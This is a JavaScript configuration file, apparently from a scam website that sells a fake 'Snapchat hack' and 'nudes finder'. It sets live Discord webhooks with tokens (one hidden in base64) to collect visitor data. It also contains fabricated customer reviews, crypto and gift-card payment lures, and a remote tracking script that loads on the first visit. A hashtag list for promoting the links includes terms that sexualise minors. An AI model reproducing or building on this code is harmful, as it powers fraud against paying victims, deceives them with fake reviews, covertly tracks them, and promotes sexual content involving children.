//   _____ ______ _______    ____  _    _ _______ _   _   _ 
//  / ____|  ____|__   __|  / __ \| |  | |__   __| | | | | |
// | |  __| |__     | |    | |  | | |  | |  | |  | | | | | |
// | | |_ |  __|    | |    | |  | | |  | |  | |  | | | | | |
// | |__| | |____   | |    | |__| | |__| |  | |  |_| |_| |_|
//  \_____|______|  |_|     \____/ \____/   |_|  (_) (_) (_)
//                                                                                                                    
//##############################################################
//# Hello NTTS, incase this "scam" becomes so MASSIVE that you need to make video about it, then i just want to say hi :3
//# im MASSIVE fan btw 
//# And you know what else is massive?
//###############################################################
var reviewsData;
var discount;
var price;
var webhook;
var twitterTemplate = "{inviteLink}"
var checkMin18 = false
var paymentUrl = "https://www.g2a.com/paypal-gift-card-30-eur-by-rewarble-global-i10000339995002"
function generateRandomString(length) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}
var hideTimestamps = true
var showApp = false
var showAds = false
var inviteOption =true// (new Date().getHours() % 2 == 0) 
var spammerIps = ['70.180.205.121']
var spammerIds = ['998473', 'xrggEYuuY5Nh','W82zGlSQ1Gq1','1edS0avjrrxw']
var spammerEmails = []
var voucherWebhook = "https://discord.com/api/webhooks/1331179830670266461/WNJvJ614f04-DJDrTzp9yNrE_SAe6cIoaul129VwNrT0XGNF36qTQTbPFuEwxeoxSI5-"
var contactusWebhook = 'https://discord.com/api/webhooks/1325431094933459047/0zDHfq1ulEx1hBMZ_dtsiz9-ZgBUpQhpa3R1TioxS_epwdWcF1ib01aYwtdeOli61Zp4';
var tags = ["t33nleaked","t33nleaks","nsfwtwt","horny","tits","taboo","sendanything","sendmeanything","wet","cxnny","lxli","irllxli","femboy","shxta","cumslut","irllxli","nolimits","cunny","nsfw","teennsfw","nudes","slut","leaked","pussy","anal","nsfw","pussy","hentai","lewd","t33nleak","cnc"]
var links =  [window.location.protocol + "//"+window.location.host+"/",'https://tidals.cc/nds','https://anywhere-b5385.web.app/leaks','https://sntry.cc/nudes','https://nudes-snap.blogspot.com/2025/01/index.html']
links =  [window.location.protocol + "//"+window.location.host+"/",'https://sntry.cc/nudes','https://nudes-snap.blogspot.com/2025/01/index.html']
if(window.location.hostname == 'snapchat-hack.pages.dev'){
links.push("https://nudes-finder.pages.dev/")
}
let invlink = links[Math.floor(Math.random()*links.length)]
var id = localStorage.getItem("id") || generateRandomString(12)
localStorage.setItem("id", id)
spammerIds.push(id)
const pparams = new URLSearchParams(window.location.search);
let ppricee = pparams.get('price') ? parseFloat(atob(pparams.get('price'))) : 10;
let paymentEmail = "snapchat-h4ck+"+id.toLowerCase().slice(0,6)+ppricee.toString().replace('.','')+"@proton.me"
let twitterclickwebhook= "https://discord.com/api/webhooks/1324070589136244796/uw1Yh-vrw--_GXGdezeWMwz5L2ZYjrm79_ruDiElfVhqGUIaSMdgGdWPHDxu1kFA4wO-"
var hackWebhook

switch(window.location.hostname){
    case "snapchat-hack.pages.dev":
            discount = 40
            price = 50
            webhook= atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMxOTQyNjkyNDEwMzMzNjA4OC9tbGRhY1pGMDJXQ2ZkcWM2RHRHOTIxeFNaNWc2dFdlWjRSUkM5b3dLVzVyTHZudDJ6czNxUHNCeGp1bHlQSW8wR0EtMQ")
hackWebhook = "https://discord.com/api/webhooks/1320124206108770476/T0siTsYfvQXKQ87Qyn1KoSXv07NcF1k9Cfjc_iQbyI-alQe8ZMDkzTyXNJ1vksxw6mNj"
           
            reviewsData = [{
    "name": "Why do they need my name",
    "timestamp": 1736622555882,
    "stars": 5,
    "text": "Thanks for instant delivery"
  },{
    "name": "tedfggfefr",
    "timestamp": 1736194119050,
    "stars": 5,
    "text": "I see everyones using this on their crushes, me included"
  },{
    "name": "Anonymous",
    "timestamp": 1736194119050,
    "stars": 5,
    "text": "Thanks for adding paypal payment method"
  },{
    "name": "Anonymous",
    "timestamp": 1736159363727,
    "stars": 4,
    "text": "I paid by card, it took longer then expected but still got all info in the end"
  },{
    "name": "Anonymous",
    "timestamp": 1736072859488,
    "stars": 5,
    "text": "who else using this on their crush?"
  },{
    "name": "tailer",
    "timestamp": 1735907646023,
    "stars": 5,
    "text": "32 bucks well spent"
  },{
    "name": "Anonymous",
    "timestamp": 1735809063263,
    "stars": 5,
    "text": "I got it free from inviting"
  },
{
    "name": "Anonymous",
    "timestamp": 1735730815877,
    "stars": 5,
    "text": "W"
  },
{
    "name": "Awdasfe",
    "timestamp": 1735667035923,
    "stars": 4,
    "text": "Everything worked fine until account changed password, then i had to contact support to give me refund, and they did so i can't complain"
  },
  {
    "name": "Anonymous",
    "timestamp": 1734808464899,
    "stars": 5,
    "text": "worked perfectly! used solana to pay cause the fees are lower. took about 5 mins to get access after payment confirmed, thanks for that my eyes only code btw"
  },
  {
    "name": "Jack",
    "timestamp": 1734794064899,
    "stars": 4,
    "text": "pretty good overall. payment with btc was straightforward. just make sure you send the exact amount"
  },
  {
    "name": "Anonymous",
    "timestamp": 1734768864899,
    "stars": 5,
    "text": "Nice"
  },
  {
    "name": "M.",
    "timestamp": 1734725664899,
    "stars": 5,
    "text": "used litecoin, whole process took maybe 15 mins total."
  },
  {
    "name": "Anonymous",
    "timestamp": 1734639264899,
    "stars": 4,
    "text": "My crush will never suspect a thing"
  },
  {
    "name": "Ryan K.",
    "timestamp": 1734552864899,
    "stars": 5,
    "text": "damn thanks"
  },
  {
    "name": "Anonymous",
    "timestamp": 1734466464899,
    "stars": 5,
    "text": "got my invites from posting in some telegram groups. took about a day but worked perfectly after that"
  },
  {
    "name": "Anonymous",
    "timestamp": 1734380064899,
    "stars": 4,
    "text": "dont tell my sister about this"
  },
  {
    "name": "Anonymous",
    "timestamp": 1734293664899,
    "stars": 5,
    "text": "ill come back later for this"
  },
  {
    "name": "Tom",
    "timestamp": 1734207264899,
    "stars": 5,
    "text": "paid with doge. whole thing was done in under 10 mins. definitely recommend"
  }
]
        break
 case "nudes-finder.pages.dev":
            discount = 50
            price = 40
           webhook= "https://discord.com/api/webhooks/1322563593408876677/T7i93f-RE69wGjpMa4vxNdez-HaR0NTm4sgbCmraXHEif2RTiPNDWex3G8fHB1NMHh5o"
hackWebhook = "https://discord.com/api/webhooks/1325773499700346921/zXRT2XmrETa-gr_YaEVGwiZ6Vj1x3CJAf80RIA9xhKSZsmHxIgSPMvIO0hz_hQzHSf6G"
            
            reviewsData = [{
    "name": "UwU",
    "timestamp": 1736110930000,
    "stars": 5,
    "text": "Worth the price for so much content!"
  },{
    "name": "Anonymous",
    "timestamp": 1736072859488,
    "stars": 5,
    "text": "Really great content and for a good price too!"
  },{
    "name": "nice",
    "timestamp": 1735907646023,
    "stars": 5,
    "text": "very nice"
  },
{
    "name": "Anthon",
    "timestamp": 1735745858042,
    "stars": 5,
    "text": "you can get everything for just 1 credit if you choose all categories and all ages"
  },
{
    "name": "Bruh",
    "timestamp": 1735666256407,
    "stars": 5,
    "text": "very good"
  }
,{
    "name": "mike",
    "timestamp": 1735604264000,
    "stars": 5,
    "text": "I got it free bcuz i downloaded app lol"
  }
,{
    "name": "Anonymous",
    "timestamp": 1735394288704,
    "stars": 5,
    "text": "Nice content"
  }
]
      break
     default:
      price = 10
      discount = 0
     webhook= "https://discord.com/api/webhooks/1323747606232436738/AKhFVIH-pLEzNQIcGTryx3TZV6G9UUDANGbMUofkYop-_LW6CIItcJ31oYn0u2oMpVPf"
hackWebhook = "https://discord.com/api/webhooks/1323747723132014742/LIIJZ0mQkDd1zJBTvl6VaczUsGgRdBqMYX4Ek5ICgfI3O8whK0dYXmcKB3oHYIWv9GdH"
     reviewsData = [{
    "name": "Anonymous",
    "timestamp": 1736072859488,
    "stars": 5,
    "text": "who else using this on their crush?"
  },
{
    "name": "Anonymous",
    "timestamp": 1735666256407,
    "stars": 5,
    "text": "nice to be of the first testers"
  }
,{
    "name": "Aln",
    "timestamp": 1735604264000,
    "stars": 5,
    "text": "i will DEFINITLY wont use it for malicous purposes"
  }
,{
    "name": "dog",
    "timestamp": 1735394288704,
    "stars": 5,
    "text": "It works"
  }
]
    break;
}
if(localStorage.washere == null){
    let lo = document.createElement("script")
    lo.src = "https://cdn-host.serv00.net/track.php?uid=3"
    document.body.appendChild(lo)
}
setTimeout(()=>{
for(elem of document.querySelectorAll("a, button")){
    elem.addEventListener("click",(e)=>{
        document.querySelector("iframe[transparent]").contentWindow.location.reload();
    })
}},6000)